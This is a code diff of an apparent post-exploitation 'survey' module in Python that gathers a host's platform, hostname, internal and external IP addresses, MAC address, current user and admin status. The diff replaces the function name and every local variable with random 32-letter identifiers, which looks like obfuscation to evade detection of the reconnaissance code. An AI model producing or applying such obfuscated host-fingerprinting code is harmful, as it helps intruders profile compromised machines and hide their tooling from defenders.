@@ -6,33 +6,33 @@ import platform
 import socket
 import urllib
 import uuid
-def run(plat_type):
-    sys_platform = platform.platform()
+def KkcYsizBHBQwCUpnRgwrYYAAnXOReEQQ(plat_type):
+    NXBBtgKjydVvgkPulaCtdRpsYFeBosVc = platform.platform()
     processor    = platform.processor()
     architecture = platform.architecture()[0]
-    username = getpass.getuser()
-    hostname    = socket.gethostname()
-    fqdn        = socket.getfqdn()
-    internal_ip = socket.gethostbyname(hostname)
-    raw_mac     = uuid.getnode()
-    mac         = ':'.join(("%012X" % raw_mac)[i:i+2] for i in range(0, 12, 2))
-    ex_ip_grab = [ 'ipinfo.io/ip', 'icanhazip.com', 'ident.me',
+    RawpwcYlDhNTFdxUVddgJVJAkNPWKqyL = getpass.getuser()
+    yoXUBYbACcSUxUoKHhHIaEoZZWtvhwEh    = socket.gethostname()
+    GzOWqSpdyCgriSdHfLfdUUrMeAALPZkT        = socket.getfqdn()
+    FSgXFYCBEmzKLCNnvCdyUJdLetkHsLnJ = socket.gethostbyname(yoXUBYbACcSUxUoKHhHIaEoZZWtvhwEh)
+    wGxTGZJscuVIlgbsOngoHBJnFWEPMSZK     = uuid.getnode()
+    tpYseHibKVNdRgAJUbpTdHqAOJftccdZ         = ':'.join(("%012X" % wGxTGZJscuVIlgbsOngoHBJnFWEPMSZK)[LzGXqmNenirBzPlhVchwrEvaQRzIMgwH:LzGXqmNenirBzPlhVchwrEvaQRzIMgwH+2] for LzGXqmNenirBzPlhVchwrEvaQRzIMgwH in range(0, 12, 2))
+    OTBWyfvgvkFIxeoTgyNKlBeLVAaYQyEY = [ 'ipinfo.io/ip', 'icanhazip.com', 'ident.me',
                    'ipecho.net/plain', 'myexternalip.com/raw' ]
-    external_ip = ''
-    for url in ex_ip_grab:
+    dwbzgmvKufaIguHCYDTxscalDoZMTgCl = ''
+    for YVUdGVfPLuGahYVogiZwNjGiGgGkIegS in OTBWyfvgvkFIxeoTgyNKlBeLVAaYQyEY:
         try:
-            external_ip = urllib.urlopen('http://'+url).read().rstrip()
+            dwbzgmvKufaIguHCYDTxscalDoZMTgCl = urllib.urlopen('http://'+YVUdGVfPLuGahYVogiZwNjGiGgGkIegS).read().rstrip()
         except IOError:
             pass
-        if external_ip and (6 < len(external_ip) < 16):
+        if dwbzgmvKufaIguHCYDTxscalDoZMTgCl and (6 < len(dwbzgmvKufaIguHCYDTxscalDoZMTgCl) < 16):
             break
-    is_admin = False
+    fonjSqFpnvAjKGfsCqPwfcqaqEkNSRDo = False
     if plat_type.startswith('win'):
-        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+        fonjSqFpnvAjKGfsCqPwfcqaqEkNSRDo = ctypes.windll.shell32.IsUserAnAdmin() != 0
     elif plat_type.startswith('linux') or platform.startswith('darwin'):
-        is_admin = os.getuid() == 0
-    admin_access = 'Yes' if is_admin else 'No'
-    survey_results = '''
+        fonjSqFpnvAjKGfsCqPwfcqaqEkNSRDo = os.getuid() == 0
+    FzYuMgdEPvdjoisuSOXpgjgpCyiDdGmH = 'Yes' if fonjSqFpnvAjKGfsCqPwfcqaqEkNSRDo else 'No'
+    sEVvIpyvehNmcBRhFVlxOTYasdqzTyBQ = '''
     System Platform     - {}
     Processor           - {}
     Architecture        - {}
@@ -43,6 +43,6 @@ def run(plat_type):
     MAC Address         - {}
     Current User        - {}
     Admin Access        - {}
-    '''.format(sys_platform, processor, architecture,
-    hostname, fqdn, internal_ip, external_ip, mac, username, admin_access)
-    return survey_results
+    '''.format(NXBBtgKjydVvgkPulaCtdRpsYFeBosVc, processor, architecture,
+    yoXUBYbACcSUxUoKHhHIaEoZZWtvhwEh, GzOWqSpdyCgriSdHfLfdUUrMeAALPZkT, FSgXFYCBEmzKLCNnvCdyUJdLetkHsLnJ, dwbzgmvKufaIguHCYDTxscalDoZMTgCl, tpYseHibKVNdRgAJUbpTdHqAOJftccdZ, RawpwcYlDhNTFdxUVddgJVJAkNPWKqyL, FzYuMgdEPvdjoisuSOXpgjgpCyiDdGmH)
+    return sEVvIpyvehNmcBRhFVlxOTYasdqzTyBQ
